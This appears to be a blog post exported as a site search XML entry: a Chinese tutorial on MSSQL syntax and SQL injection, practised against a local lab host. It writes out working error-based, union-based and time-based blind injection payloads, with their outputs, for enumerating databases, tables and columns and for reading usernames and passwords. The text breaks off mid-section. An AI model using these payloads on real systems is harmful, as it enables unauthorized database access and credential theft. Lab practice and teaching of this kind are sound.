<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mssql注入学习</title>
      <link href="/posts/49982/"/>
      <url>/posts/49982/</url>
      
        <content type="html"><![CDATA[<h1 id="MSSQL简介："><a href="#MSSQL简介：" class="headerlink" title="MSSQL简介："></a>MSSQL简介：</h1><p>SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。    同时mssql数据库具有强大的存储过程能够执行不同的高级功能，从而成为攻击者的突破口，本文复习了mssql的基本语法以及日常渗透过程中的基础使用，下面开始学习！</p><p>mssql默认安装数据库</p><ul><li><strong>master</strong><br>master 数据库记录了所有的 SQL Server 数据库系统的系统级信息，如用户帐户，配置设置，并存在所有其他数据库信息。</li><li><strong>model</strong><br>model 数据库是一个模板数据库。每当创建一个新的数据库（包括系统数据库的TempDB），会创建一个以 Model 数据库为副本数据库，并更改成你创建数据库时所用的名称。</li><li><strong>msdb</strong><br>msdb 数据库是 SQL Server 代理的数据库，用于配置警报使用 SQL Server 代理和预定作业等。</li><li><strong>tempdb</strong><br>tempddb 数据库是由 SQL Server 用于暂时存储数据的，这其中包含所有临时表，临时存储过程，并通过 SQL Server 生成任何其他临时存储需求。</li></ul><h1 id="MSSQL语法"><a href="#MSSQL语法" class="headerlink" title="MSSQL语法"></a>MSSQL语法</h1><p>mssql sql语法对大小写不敏感，可以将sql分为两个部分：数据操作语言(DML)和数据定义语言(DDL)</p><p>数据操作语言（DML）只要是用于查询和更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 从数据库中获取数据</span><br><span class="line">update 更新数据库中的数据</span><br><span class="line">delete 删除数据</span><br><span class="line">insert into 添加数据</span><br></pre></td></tr></table></figure><p>数据库定义语言(DDL)  主要用于创建，删除，增加索引，键，约束等</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE - 创建新数据库</span><br><span class="line">ALTER DATABASE - 修改数据库</span><br><span class="line">CREATE TABLE - 创建新表</span><br><span class="line">ALTER TABLE - 变更（改变）数据库表</span><br><span class="line">DROP TABLE - 删除表</span><br><span class="line">CREATE INDEX - 创建索引（搜索键）</span><br><span class="line">DROP INDEX - 删除索引</span><br></pre></td></tr></table></figure><h2 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1.创建数据库"></a>1.创建数据库</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database 数据库名</span><br><span class="line">实例：</span><br><span class="line"><span class="keyword">create</span> database SQLTest</span><br></pre></td></tr></table></figure><h2 id="2-select-语句"><a href="#2-select-语句" class="headerlink" title="2.select 语句"></a>2.select 语句</h2><p>select 语句用于查询指定数据表中的数据，select语句中可以使用各种条件对查询数据进行限制</p><p>where—-有条件的从表中选取数据</p><p>and 和 or — 基于一个以上的条件对记录进行过滤</p><p>order by —对结果进行排序（默认是升序），若在语句后面添加desc，则是降序</p><p>top —规定要返回记录的数目（可以是返回的具体数目 ， 也可以是百分比）</p><p>like —在where子句中搜索列的指定模式</p><p>between—在where子句中使用 ，选取介于两者之间的数据</p><p>select distinct—句用于返回唯一不同的值</p><p>通配符（%、_ 、[charlist] 、[^charlist]/[!charlist] ）—可替代一个或多个字符，必须与like一起使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">select 列名称 from 表名称</span><br><span class="line"></span><br><span class="line">select * from user;</span><br><span class="line">select * from user where id=1;  查询id为1的数据</span><br><span class="line"></span><br><span class="line">and，or</span><br><span class="line">select * from user where id&gt;3 and id&lt;5   查询id大于3和小于5的数据</span><br><span class="line">select * from user where id&gt;3 or id&lt;5    查询id大于3或小于5的数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">order by </span><br><span class="line">select * from user order by name;根据name进行排序</span><br><span class="line">select * from user order by name desc; 降序排列</span><br><span class="line">select * from user order by name asc;升序排序</span><br><span class="line"></span><br><span class="line">top</span><br><span class="line">select top 1 name from users，查询user表中name列的第一条数据</span><br><span class="line">select top 1 name from users where name !=&quot;a&quot; 查询user表中name列不等于a的数据，假设第一条数据的值为a，那么就可以通过该方法获取到第二条的数据</span><br><span class="line"></span><br><span class="line">like  通配符</span><br><span class="line">select * from teacher  where  name like &#x27;a%&#x27;;  --查找name是以a开头的所有列</span><br><span class="line">select * from teacher where name like &#x27;%b&#x27;;  --查找name是以b结尾的所有列</span><br><span class="line">select * from teacher where  name  like &#x27;a_&#x27;;  --查找name是以a开头后面只有一个字符 的所有列</span><br><span class="line">select * from teacher where name like &#x27;[ac]%&#x27;;  --  查找name是以a/c开头的所有列</span><br><span class="line">select * from teacher  where name like &#x27;[^ac]%&#x27;; --查找name 不是以a/c开头的所有列</span><br><span class="line"></span><br><span class="line">between and</span><br><span class="line">select * from user where name between 1 and 2 查找那么介于1和2之间的数据</span><br></pre></td></tr></table></figure><h2 id="3-insert-into语句"><a href="#3-insert-into语句" class="headerlink" title="3.insert into语句"></a>3.insert into语句</h2><p>insert语句用户向表中插入数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名称 values(值1，值2)  值的数量要与表的列数量要相等</span><br><span class="line"></span><br><span class="line">insert into 表名称(列1，列2) values(值1，值2)   向表的指定列插入指定的值</span><br><span class="line"></span><br><span class="line">举例;</span><br><span class="line">insert into users(id,username,password) values(1,&#x27;a&#x27;,&#x27;b&#x27;)</span><br></pre></td></tr></table></figure><h2 id="4-UPDATE-语句"><a href="#4-UPDATE-语句" class="headerlink" title="4.UPDATE 语句"></a>4.UPDATE 语句</h2><p>UPDATE语句用于更新数据以及权限等。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update 表名称 set 列名称=新值 where 列名称=某值</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">update users set username=&quot;张三&quot; where id=1</span><br></pre></td></tr></table></figure><h2 id="5-DELETE-语句"><a href="#5-DELETE-语句" class="headerlink" title="5.DELETE 语句"></a>5.DELETE 语句</h2><p>delete 用于删除表中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM 表名称 where 列名称=值</span><br></pre></td></tr></table></figure><h1 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>MSSQL数据库中存在大量的系统视图表，我们可以通过自带表格查询我们需要的字段信息</p><p>1.<strong>sysobjects</strong>表</p><p> 此系统表中对我们有用的只有3个字段，<code>NAME</code>字段和<code>XTYPE</code>字段和<code>ID</code>字段，<code>name就是表名信息</code>，<code>xtype是代表表的类型</code>，只有两个参数，<code>S</code>代表系统自带表，<code>U</code>代表用户创建的表，<code>id</code>字段的值用来<code>连接syscolumns</code>表</p><p>select * from sysobjects where xtype=’U’</p><p><img src="image-20210902105546186.png" alt="image-20210902105546186"></p><p>2.syscolumns 表</p><p>syscolumns表中包含了表中所有的字段，可以通过sysobjects表中的id值进行定位，例如查询users表的所有的字段</p><p><strong>select * from syscolumns where id=1611152785</strong></p><p><img src="image-20210902110644315.png" alt="image-20210902110644315"></p><p>实现MySQL的group_concat功能：</p><p><strong>SELECT top 1 id, [name] = stuff((SELECT ‘,’ + [name] FROM syscolumns sys WHERE sys.id = syscolumns.id FOR xml path(‘’)) , 1 , 1 , ‘’) FROM syscolumns where id =1611152785</strong></p><p><img src="image-20210902110936902.png" alt="image-20210902110936902"></p><p>MSSQL注入常用参数</p><p><code>@@version</code>，查询当前数据库版本 <code>db_name()</code>，查询当前数据库名称 <code>user</code>，查询当前用户 <code>IS_SRVROLEMEMBER()</code>，查询数据库权限。</p><p>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</p><p>查询是否具备对应的权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 返回为1时证明有该权限</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;));--</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;serveradmin&#x27;));--</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;setupadmin&#x27;));--</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;securityadmin&#x27;));--</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;diskadmin&#x27;));--</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&#x27;bulkadmin&#x27;));--</span><br><span class="line">and 1=(select IS_MEMBER(&#x27;db_owner&#x27;));</span><br></pre></td></tr></table></figure><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="判断是否是mssql数据库"><a href="#判断是否是mssql数据库" class="headerlink" title="判断是否是mssql数据库"></a>判断是否是mssql数据库</h3><p>sysobjects数据表是mssql数据库特有的，所以查询该数据库如果成功的话就大概率为mssql数据库</p><p>(select count(*) from sysobjects)&gt;0   该语句是统计sysobjects中的列数，如果为mssql数据库的话，结果恒为真，如果不是，则会报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20and%20(select%20count(*)%20from%20sysobjects)%3E0 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and user&gt;0   </span><br><span class="line"><span class="meta">#</span><span class="bash">回显</span></span><br><span class="line">Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;dbo&#x27; 转换成数据类型 int 时失败。</span><br><span class="line"></span><br><span class="line">?id=1 and (select count(*) from msysobjects)&gt;0　　access数据库</span><br></pre></td></tr></table></figure><h3 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select @@version)   获取版本信息</span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20and 1=(select @@version) --+</span><br><span class="line"><span class="meta">#</span><span class="bash">回显信息</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) Apr 2 2010 15:48:46 Copyright (c) Microsoft Corporation Developer Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor) &#x27; 转换成数据类型 int 时失败</span><br></pre></td></tr></table></figure><h3 id="查看数据库名称"><a href="#查看数据库名称" class="headerlink" title="查看数据库名称"></a>查看数据库名称</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select db_name())</span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20and 1=(select db_name()) --+</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">回显</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;test&#x27; 转换成数据类型 int 时失败。</span><br></pre></td></tr></table></figure><h3 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h3><p>使用top 语句获取第一个数据库的名称，数据库名称可以在sysdatabases数据表中进行查询，当dbid&gt;4时显示的为用户创建的数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4) --+</span><br><span class="line"><span class="meta">#</span><span class="bash">返回值</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;ReportServer&#x27; 转换成数据类型 int 时失败</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获取第二个数据库</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name!=&#x27;ReportServer&#x27;) --+</span><br><span class="line"></span><br><span class="line">通过添加and语句使得查询第二条语句，可以不断进行累加，获取所有的数据库名</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from master..sysdatabases where dbid&gt;5 )</span><br><span class="line">修改bid的值可以达到相同的效果</span><br><span class="line"></span><br><span class="line">获取所有的数据库名</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select  name from master..sysdatabases for xml path) --+</span><br></pre></td></tr></table></figure><p>在源代码中可以看到所有的数据库名<img src="image-20210902133706754.png" alt="image-20210902133706754"></p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>获取表明可以通过sysobjects中xtype为‘U’的表进行查询</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select top 1 name from sysobjects where xtype=&#x27;U&#x27;) </span><br><span class="line">获取第一个的xtype=u的数据表</span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from sysobjects where xtype=&#x27;U&#x27;) --+</span><br><span class="line"></span><br><span class="line">返回值：</span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;emails&#x27; 转换成数据类型 int 时失败。</span><br><span class="line"></span><br><span class="line">同理可以增加限定条件获取第二个表的名称</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from sysobjects where xtype=&#x27;U&#x27; and name!=&#x27;emails&#x27;) --+</span><br><span class="line">返回值：</span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;uagents&#x27; 转换成数据类型 int 时失败</span><br><span class="line"></span><br><span class="line">同样可以通过xpath 获取所有的数据表</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select  name from sysobjects  for xml path) --+</span><br></pre></td></tr></table></figure><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p>获取列名之前首先需要在sysobjects中获取对应数据表的ID值，然后根据ID值在syscolumns表中进行查询！</p><p>sql语句如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;))</span><br><span class="line"><span class="meta">#</span><span class="bash">假设已知数据表名为users时查询数据表中的所有的字段</span></span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;)) --+</span><br><span class="line"><span class="meta">#</span><span class="bash">返回值</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;id&#x27; 转换成数据类型 int 时失败。</span><br><span class="line"></span><br><span class="line">获取第二个</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;)and name!=&#x27;id&#x27;) --+</span><br><span class="line"><span class="meta">#</span><span class="bash">返回值</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;username&#x27; 转换成数据类型 int 时失败。</span><br><span class="line"></span><br><span class="line">获取所有的列</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;)for xml path) --+</span><br><span class="line"></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;idusernamepassword&#x27; 转换成数据类型 int 时失败。</span><br><span class="line"></span><br><span class="line">在源码中可以看到分开的数据列名</span><br></pre></td></tr></table></figure><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">直接通过select读取数据</span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 username from users)--+</span><br><span class="line"><span class="meta">#</span><span class="bash">返回值</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 varchar 值 &#x27;Dumb&#x27; 转换成数据类型 int 时失败。</span><br><span class="line">其他读取值和上面类似</span><br></pre></td></tr></table></figure><h3 id="实战靶场"><a href="#实战靶场" class="headerlink" title="实战靶场"></a>实战靶场</h3><p>1.判断是否是注入点</p><p>使用 ‘   and 1=1   and 1=2进行判断</p><p><a href="http://192.168.147.161/less-2.asp?id=1&#39;">http://192.168.147.161/less-2.asp?id=1&#39;</a>   报错</p><p><a href="http://192.168.147.161/less-2.asp?id=1">http://192.168.147.161/less-2.asp?id=1</a>  and 1=1 正常</p><p><a href="http://192.168.147.161/less-2.asp?id=1">http://192.168.147.161/less-2.asp?id=1</a> and 1=2 正常</p><p>2.判断列数</p><p><a href="http://192.168.147.161/less-2.asp?id=1">http://192.168.147.161/less-2.asp?id=1</a> order by 4  显示错误</p><p><a href="http://192.168.147.161/less-2.asp?id=1">http://192.168.147.161/less-2.asp?id=1</a> order by 3  显示成功</p><p>证明存在3列</p><p>3.判断回显位</p><p><a href="http://192.168.147.161/less-2.asp?id=0">http://192.168.147.161/less-2.asp?id=0</a> union all select 1,2,3</p><p><img src="image-20210902174400099.png" alt="image-20210902174400099"></p><p>说明回显位是2和3的位置</p><p>4.查询基础信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db_name() 数据库名</span><br><span class="line">@<span class="variable">@version</span>  版本信息</span><br><span class="line"><span class="keyword">user</span>,<span class="built_in">system_user</span>,<span class="built_in">current_user</span>,user_name–<span class="operator">-</span> 获取当前⽤户名</span><br></pre></td></tr></table></figure><p><a href="http://192.168.147.161/less-2.asp?id=0">http://192.168.147.161/less-2.asp?id=0</a> union all select 1,@@version,db_name()</p><p><img src="image-20210902174657482.png" alt="image-20210902174657482"></p><p>5.查询数据表名</p><p>mssql数据库中存在information_schema.schemat表，但是每个不同的数据库下存在information_schema.schemat表 ，所以在使用时需要指定特定的数据库！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select top 1 table_name from test.information_schema.tables)</span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;U&#x27;)</span><br><span class="line"><span class="meta">#</span><span class="bash">获取所有的表</span></span><br><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select  table_name from test.information_schema.tables for xml path(&#x27;&#x27;))</span><br></pre></td></tr></table></figure><p><img src="image-20210902180434689.png" alt="image-20210902180434689"></p><p><img src="image-20210902180824431.png" alt="image-20210902180824431"></p><p>6.查询所有的列</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select   top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;))</span><br><span class="line">读取users表中的第一个name的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select  name from syscolumns where id=(select id from sysobjects where name=(select top 1 name from sysobjects where xtype=&#x27;U&#x27;)) for xml path)</span><br></pre></td></tr></table></figure><p>7.读取数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select  id,username,password from test..users  for xml path)</span><br><span class="line"></span><br><span class="line">读取users表下的id，username，password字段的所有的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-2.asp?id=-1 union all select 1,username,password from users where id=3</span><br><span class="line"></span><br><span class="line">读取ID为3的users表下的username，passoword字段！</span><br></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>时间盲注是基于响应包的延时时间进行判断，在mssql中延时函数可以使用<strong>WAITFOR DELAY ‘0:0:n’</strong>  对响应时间进行判断。但是单独使用该语句好像并没有什么作用，那么我们结合if语句可以实现通过延时时间的长短来判断if语句是否成立，从而达到时间盲注的效果，语法如下：</p><p>if exists( ) WAITFOR DELAY ‘0:0:n’</p><p>下面开始盲注学习</p><h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>通过WAITFOR DELAY ‘0:0:n’ 语句根据延时时间的长短来判断是否存在注入点</p><p>正常sql语句如下：</p><p>select username from test..users where id=1   </p><p>当我们尝试使用 延时注入判断是否存在注入点时</p><p>select username from test..users where id=1 waitfor delay ‘0:0:2’   这样id=1的条件是存在的，那么响应时间就会大于2秒钟，那么基本可以判断存在注入点！</p><h3 id="猜测数据库"><a href="#猜测数据库" class="headerlink" title="猜测数据库"></a>猜测数据库</h3><p>猜测数据库时可以通过前面说到的if语句配合延时进行注入查询</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> if(exists(select name from master..sysdatabases where dbid=5))waitfor delay &#x27;0:0:2&#x27;</span><br><span class="line"> </span><br><span class="line">通过查询master.dbo.sysdatabases表中的用户表dbid的值大于五是否存在来判断是否存在用户表（当dbid&gt;4时的表都是用户表）,如果成功延时，则证明存在用户表</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="猜测数据库长度"><a href="#猜测数据库长度" class="headerlink" title="猜测数据库长度"></a>猜测数据库长度</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ((select count(*) from master.dbo.sysdatabases where dbid=5 and len(name)=12)=1) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"></span><br><span class="line">通过前面的判断我们知道用户表已存在，那么我们可以添加对表name字段长度的判断进行锁定数据表的长度， 可以发现当表长度为12时，成功触发延时条件。</span><br></pre></td></tr></table></figure><h4 id="猜测数据库名"><a href="#猜测数据库名" class="headerlink" title="猜测数据库名"></a>猜测数据库名</h4><p>猜测数据库名和猜测数据库长度差不多，这里用到了两个函数  一个是ascii() 用于将字符转化为ascii值, 另外一个是 substring() 这个函数用于截取字符串，因为我们盲注时猜字符串是单个字符进行拆解。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=8 ),1,1))=116) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"></span><br><span class="line">通过不断替换 116的值，只到执行了延时效果时，证明该字符为正确的</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">猜解第二个数据</span></span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=8 ),2,1))=101) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line">依次类推，不断的改变截取不同位置的字符，达到对数据库名的猜解为test</span><br></pre></td></tr></table></figure><h4 id="猜测表名长度"><a href="#猜测表名长度" class="headerlink" title="猜测表名长度"></a>猜测表名长度</h4><p>猜测表名可以在test..sysobjects表中进行查询，猜解的方式和数据库类似</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((select count(*) from test..sysobjects where xtype=&#x27;U&#x27; and len(name)=5)=1) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line">当长度为5时，延时成功，证明表长度为5</span><br></pre></td></tr></table></figure><h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">猜解第一个字符为e</span></span><br><span class="line">if((select count(*) from test..sysobjects where name in (select top 1 name from test..sysobjects where xtype=&#x27;U&#x27;)and ascii(substring(name,1,1))=101) =1) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"><span class="meta">#</span><span class="bash">猜解第二个字符为m</span></span><br><span class="line">if((select count(*) from test..sysobjects where name in (select top 1 name from test..sysobjects where xtype=&#x27;U&#x27;)and ascii(substring(name,2,1))=109) =1) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line">依次类推可以获取所有的数据</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">通过添加name!=<span class="string">&quot;前一个表表名&quot;</span></span> </span><br><span class="line">if((select count(*) from test..sysobjects where name in (select top 1 name from test..sysobjects where xtype=&#x27;U&#x27; and name!=&#x27;emails&#x27;)and ascii(substring(name,1,1))=117) =1) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line">通过该条件获取下面的表的表名</span><br></pre></td></tr></table></figure><h4 id="猜解列名长度"><a href="#猜解列名长度" class="headerlink" title="猜解列名长度"></a>猜解列名长度</h4><p>猜解列名是通过syscolumns表进行查询获取，已知表名是users</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 